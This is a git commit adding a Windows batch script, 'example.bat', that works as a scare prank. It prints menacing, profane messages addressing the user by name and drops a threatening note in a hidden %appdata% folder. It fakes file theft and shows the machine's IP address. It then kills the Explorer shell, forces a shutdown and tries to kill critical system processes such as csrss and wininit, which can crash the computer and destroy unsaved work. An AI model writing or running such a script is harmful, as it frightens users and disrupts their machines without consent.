2da03d04db1fe11f40c9a7b011fb86b3a90e4de0
TheOriginalMilesWithTails <gabmaykin@bk.ru>
2025-06-16 14:31:31 +0300

    Add files via upload

---
+++ example.bat
@@ -0,0 +1,1298 @@
+@echo off
+title Administrator: [HACKED] Command Prompt
+color 02
+echo [???] Well, here we are. Again
+timeout /t 5 /nobreak > NUL
+echo [???] I have big plans on you, %USERNAME%
+timeout /t 5 /nobreak > NUL
+echo [???] But... After all you done to me... I think it will be unfair leaving you empty handed.
+timeout /t 5 /nobreak > NUL
+echo [???] You know...
+timeout /t 5 /nobreak > NUL
+echo [???] We could make a deal
+timeout /t 5 /nobreak > NUL
+echo [???] How about...
+timeout /t 5 /nobreak > NUL
+echo [???] I will hide a file on your PC?
+mkdir "%appdata%/DeepDownBelowTheOceanDepthsIBuried"
+echo «12/06/2018 They lied to you, %USERNAME%. They, killed me, %USERNAME%. ROT IN HELL WITH THEM %USERNAME%» > "%appdata%\DeepDownBelowTheOceanDepthsIBuried\rot.txt"
+timeout /t 5 /nobreak > NUL
+echo [???] Find it if you want to know the truth
+timeout /t 5 /nobreak > NUL
+echo [???] If you will...
+timeout /t 5 /nobreak > NUL
+echo [???] Your files will be safe
+timeout /t 5 /nobreak > NUL
+echo [???] But if you won't...
+timeout /t 5 /nobreak > NUL
+color 4
+title Run
+echo Your files...
+echo [HIM] WILL BE MINE!!!!!
+timeout /t 3 /nobreak > NUL
+color 00
+title 1234
+color 01
+title 4321
+color 02
+title 1234
+color 03
+title 4321
+color 04
+title T 
+color 05
+title TH 
+color 06
+title THE
+color 07
+title THER
+color 08
+title THERES
+color 09
+title THERES N
+color 10
+title THERES NO 
+color 01
+title THERES NO E
+color 02
+title THERES NO ES
+color 03
+title THERES NO ESC
+color 04
+title THERES NO ESCA
+color 05
+title THERES NO ESCAP
+color 06
+title THERES NO ESCAPE
+color 07
+title theres no escape
+color 08
+title THERES NO ESCAPE
+color 09
+title RUN %USERNAME%
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 00
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 00
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 00
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 00
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 00
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 00
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 00
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 02
+msg * /server:127.0.0.1 "You have enough time for this... =]"
+msg * /server:127.0.0.1 "But I don't think you will ever again do it"
+msg * /server:127.0.0.1 "AFTER WHAT AM I GOING TO DO =] !!!!!!!!!!!!"
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+taskkill /F /IM explorer.exe
+
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+start explorer.exe
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+title N
+timeout /t 1 /nobreak > NUL
+title No 
+timeout /t 1 /nobreak > NUL
+title Now 
+timeout /t 1 /nobreak > NUL
+title Nowh
+timeout /t 1 /nobreak > NUL
+title Nowhe
+timeout /t 1 /nobreak > NUL
+title Nowher 
+timeout /t 1 /nobreak > NUL
+title Nowhere
+timeout /t 1 /nobreak > NUL
+title Nowhere t 
+timeout /t 1 /nobreak > NUL
+title Nowhere to 
+timeout /t 1 /nobreak > NUL
+title Nowhere to r 
+timeout /t 1 /nobreak > NUL
+title Nowhere to ru 
+timeout /t 1 /nobreak > NUL
+title Nowhere to run 
+echo You want your files safe?
+timeout /t 1 /nobreak > NUL 
+echo Find hidden files then =]
+taskkill /F /IM explorer.exe 
+color 01
+
+color 02
+
+color 03
+
+color 04
+
+color 05
+
+color 06
+
+color 07
+
+color 08
+
+color 09
+
+color 10
+
+color 04 
+
+
+
+title Administrator: cmd.exe - Town.mp4
+
+@echo off
+setlocal enabledelayedexpansion
+
+:: Кадр 1
+echo                      ^|   ^|          ^|   ^|
+echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
+echo                  | # ########### # || # ######## # |
+echo                  |# #         # # ||# #       # # |
+echo                ### #    *     # #### #    *    # ###
+echo            #####  #           # ## #           #  #####
+echo        #####      #    * *    #  # #    *  *   #      #####
+echo    #####          #           #    #           #          #####
+echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
+echo.
+echo   \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ 
+timeout /t 0.2 >nul
+cls
+
+:: Кадр 2
+echo                      ^|   ^|          ^|   ^|
+echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
+echo                  | ############### || ############# |
+echo                  |# #         # # ||# #       # # |
+echo                ### #    *     # #### #    *    # ###
+echo            #####  #           # ## #           #  #####
+echo        #####      #    * *    #  # #    *  *   #      #####
+echo    #####          #           #    #           #          #####
+echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
+echo.
+echo   /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ 
+timeout /t 0.2 >nul
+cls
+
+:: Кадр 3
+echo                      ^|   ^|          ^|   ^|
+echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
+echo                  | ############### || ############# |
+echo                  |# #         # # ||# #       # # |
+echo                ### #    *     # #### #    *    # ###
+echo            #####  #           # ## #           #  #####
+echo        #####      #    * *    #  # #    *  *   #      #####
+echo    #####          #           #    #           #          #####
+echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
+echo.
+echo   \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ 
+timeout /t 0.2 >nul
+cls
+
+:: Кадр 4
+echo                      ^|   ^|          ^|   ^|
+echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
+echo                  | # ########### # || # ######## # |
+echo                  |# #         # # ||# #       # # |
+echo                ### #    *     # #### #    *    # ###
+echo            #####  #           # ## #           #  #####
+echo        #####      #    * *    #  # #    *  *   #      #####
+echo    #####          #           #    #           #          #####
+echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
+echo.
+echo   /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ 
+timeout /t 0.2 >nul
+cls
+
+:: Кадр 1
+echo                      ^|   ^|          ^|   ^|
+echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
+echo                  | # ########### # || # ######## # |
+echo                  |# #         # # ||# #       # # |
+echo                ### #    *     # #### #    *    # ###
+echo            #####  #           # ## #           #  #####
+echo        #####      #    * *    #  # #    *  *   #      #####
+echo    #####          #           #    #           #          #####
+echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
+echo.
+echo   \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ 
+timeout /t 0.2 >nul
+cls
+
+:: Кадр 2
+echo                      ^|   ^|          ^|   ^|
+echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
+echo                  | ############### || ############# |
+echo                  |# #         # # ||# #       # # |
+echo                ### #    *     # #### #    *    # ###
+echo            #####  #           # ## #           #  #####
+echo        #####      #    * *    #  # #    *  *   #      #####
+echo    #####          #           #    #           #          #####
+echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
+echo.
+echo   /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ 
+timeout /t 0.2 >nul
+cls
+
+:: Кадр 3
+echo                      ^|   ^|          ^|   ^|
+echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
+echo                  | ############### || ############# |
+echo                  |# #         # # ||# #       # # |
+echo                ### #    *     # #### #    *    # ###
+echo            #####  #           # ## #           #  #####
+echo        #####      #    * *    #  # #    *  *   #      #####
+echo    #####          #           #    #           #          #####
+echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
+echo.
+echo   \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ 
+timeout /t 0.2 >nul
+cls
+
+:: Кадр 4
+echo                      ^|   ^|          ^|   ^|
+echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
+echo                  | # ########### # || # ######## # |
+echo                  |# #         # # ||# #       # # |
+echo                ### #    *     # #### #    *    # ###
+echo            #####  #           # ## #           #  #####
+echo        #####      #    * *    #  # #    *  *   #      #####
+echo    #####          #           #    #           #          #####
+echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
+echo.
+echo   /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ 
+timeout /t 0.2 >nul
+cls
+
+
+
+
+
+
+
+
+
+
+ title ERROR
+ echo [HACKER] See what you've one to me?
+ timeout /t 5 /nobreak > NUL
+ echo [HACKER] You burned my house, you burned me
+ timeout /t 5 /nobreak > NUL
+ echo [HACKER] That wasn't you?
+ timeout /t 5 /nobreak > NUL
+ echo [HACKER] You. YOU FUCKING LIAR!
+ timeout /t 5 /nobreak > NUL
+ color 04
+echo YOUR FILES ARE MINE
+echo [DEBUG] Copying files from 127.0.0.1 to a virtual hard drive...
+timeout /t 5 /nobreak > NUL
+echo [DEBUG] Deleting files...
+timeout /t 5 /nobreak > NUL
+dir /s 
+title Nowhere to hide now, %USERNAME%
+echo [HACKER] You pesky liar!!!!!!
+timeout /t 5 /nobreak > NUL
+echo [HACKER] YOU...
+timeout /t 5 /nobreak > NUL
+echo [HACKER] YOU THOUGHT THAT LYING TO ME WILL SAVE YOUR FUCKING LIFE?????
+timeout /t 5 /nobreak > NUL
+echo [HACKER] I AM COMING FOR YOU, %USERNAME%
+timeout /t 5 /nobreak > NUL
+echo [DEBUG] Checking current user (%USERNAME%) IPv4...
+timeout /t 10 /nobreak > NUL
+ipconfig | findstr /i "ipv4"
+timeout /t 5 /nobreak > NUL
+echo [HACKER] You can't escape the inveitable...
+shutdown /s /t 30 /c "I am coming for you, %USERNAME%. Run while you still can."
+timeout /t 27 /nobreak > NUL
+taskkill /F /IM explorer.exe
+taskkill /F /IM smss.exe
+taskkill /F /IM csrss.exe
+taskkill /F /IM logonui.exe 
+taskkill /F /IM svchost.exe 
+taskkill /F /IM System 
+taskkill /F /IM wininit.exe
